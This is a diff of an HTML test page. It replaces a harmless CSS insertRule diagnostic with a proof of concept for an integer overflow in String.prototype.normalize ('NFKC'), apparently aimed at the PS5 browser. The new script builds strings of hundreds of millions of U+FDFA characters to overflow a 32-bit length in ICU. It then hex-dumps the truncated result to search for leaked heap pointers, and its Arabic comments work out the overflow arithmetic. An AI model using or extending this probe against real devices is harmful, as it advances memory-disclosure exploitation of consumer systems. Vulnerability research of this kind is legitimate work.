@@ -1,62 +1,105 @@
-<!doctype html>
+<!DOCTYPE html>
+<html>
+<head>
 <meta charset="utf-8">
-<pre id="log"></pre>
+<title>PS5 CVE-2025-46299 — normalize() Integer Overflow</title>
+</head>
+<body>
+<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
-const out = document.getElementById("log");
+const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-function log(x) {
-  out.textContent += x + "\n";
+L('[*] Starting normalize() integer overflow test...');
+
+// \uFDFA يتوسع 18x في NFKC
+// نحتاج ~238,609,295 حرف لتجاوز int32_t
+// الناتج = 238,609,295 * 18 = 4,294,967,310
+// int32_t overflow: 4,294,967,310 mod 2^32 = 14
+// إذا نجح هذا، سيُعاد نص بطول 14 حرفاً بدلاً من 4.3 مليار
+
+// نبدأ بأحجام أصغر ونتدرج
+const sizes = [
+    { name: '100M chars', count: 100000000, expected: 1800000000 },
+    { name: '119M chars (threshold)', count: 119304647, expected: 2147483646 },
+    { name: '120M chars (overflow!)', count: 120000000, expected: 2160000000 },
+    { name: '238M chars (wraps to ~14)', count: 238609295, expected: 4294967310 },
+];
+
+for (const test of sizes) {
+    L('\n--- Test: ' + test.name + ' ---');
+    L('[*] Creating string of ' + test.count + ' \\uFDFA characters...');
+    L('[*] Expected output: ' + test.expected + ' characters');
+    L('[*] int32_t max: 2,147,483,647');
+    
+    if (test.expected > 2147483647) {
+        L('[!] Expected output EXCEEDS int32_t max — overflow will occur!');
+        L('[!] Overflowed length: ' + (test.expected % 4294967296) + ' (as unsigned)');
+        L('[!] As signed int32: ' + (test.expected > 2147483647 ? test.expected - 4294967296 : test.expected));
+    }
+    
+    try {
+        // إنشاء النص الكبير
+        let bigStr = '\uFDFA'.repeat(test.count);
+        L('[+] String created. Length: ' + bigStr.length);
+        L('[*] Memory usage: ~' + Math.round(bigStr.length * 2 / 1024 / 1024) + 'MB');
+        
+        // استدعاء normalize
+        L('[*] Calling normalize("NFKC")...');
+        let result = bigStr.normalize('NFKC');
+        
+        L('[+] normalize() returned!');
+        L('[+] Result length: ' + result.length);
+        L('[+] Expected length: ~' + test.expected);
+        
+        // فحص إذا كان الطول غير متوقع
+        if (result.length < bigStr.length) {
+            L('[!] LENGTH MISMATCH! Got ' + result.length + ' but expected ~' + test.expected);
+            L('[!] This indicates integer overflow in ICU!');
+            
+            // فحص المحتوى — هل يحتوي على بيانات غير متوقعة؟
+            L('[*] Checking result content for leaked data...');
+            let anomalies = 0;
+            let hexDump = [];
+            for (let i = 0; i < result.length; i++) {
+                let code = result.charCodeAt(i);
+                hexDump.push(code.toString(16).padStart(4, '0'));
+                // \uFDFA يتوسع إلى أحرف عربية محددة
+                // أي حرف خارج هذا النطاق قد يكون بيانات مسربة
+                if (code < 0x0620 || code > 0x06FF) {
+                    if (code !== 0x0020) { // مسافة
+                        anomalies++;
+                    }
+                }
+            }
+            L('[*] Result hex: ' + hexDump.join(' '));
+            if (anomalies > 0) {
+                L('[!] FOUND ' + anomalies + ' anomalous characters!');
+                L('[!] These may be leaked heap pointers!');
+            } else {
+                L('[*] All characters appear to be valid Arabic');
+                L('[*] But the length is wrong — truncation occurred');
+            }
+        } else if (result.length === test.expected) {
+            L('[*] Length matches expected — no overflow at this size');
+        } else {
+            L('[?] Unexpected length: ' + result.length);
+        }
+        
+        // تحرير الذاكرة
+        bigStr = null;
+        result = null;
+        
+    } catch (e) {
+        L('[!] Error: ' + e.message);
+        if (e.name === 'RangeError') {
+            L('[!] RangeError — string too large for repeat()');
+        }
+    }
 }
 
-function runCase(name, initialCSS, rule, index) {
-  log("==== " + name + " ====");
-  const style = document.createElement("style");
-  style.textContent = initialCSS;
-  document.head.appendChild(style);
-
-  const sheet = style.sheet;
-  log("before cssRules.length = " + sheet.cssRules.length);
-
-  try {
-    log("calling insertRule at index " + index);
-    sheet.insertRule(rule, index);
-    log("OK: after cssRules.length = " + sheet.cssRules.length);
-  } catch (e) {
-    log("Exception: " + e.name + ": " + e.message);
-  }
-
-  style.remove();
-}
-
-log("CSS insertRule namespace diagnostic start");
-
-runCase(
-  "baseline namespace at 0",
-  "",
-  "@namespace foo url(http://example.com);",
-  0
-);
-
-runCase(
-  "one import then namespace at 1",
-  '@import url("data:text/css,body{}");',
-  "@namespace foo url(http://example.com);",
-  1
-);
-
-runCase(
-  "five imports then namespace at 5",
-  Array.from({length: 5}, (_, i) => '@import url("data:text/css,body{}?' + i + '");').join("\n"),
-  "@namespace foo url(http://example.com);",
-  5
-);
-
-runCase(
-  "normal rule then namespace should fail safely",
-  "body { color: red; }",
-  "@namespace foo url(http://example.com);",
-  1
-);
-
-log("DONE");
+L('\n[*] Test finished.');
+L('[*] If any test showed LENGTH MISMATCH, the integer overflow is confirmed.');
+L('[*] On PS5 with no-zero allocator, the truncated buffer may contain heap pointers.');
 </script>
+</body>
+</html>
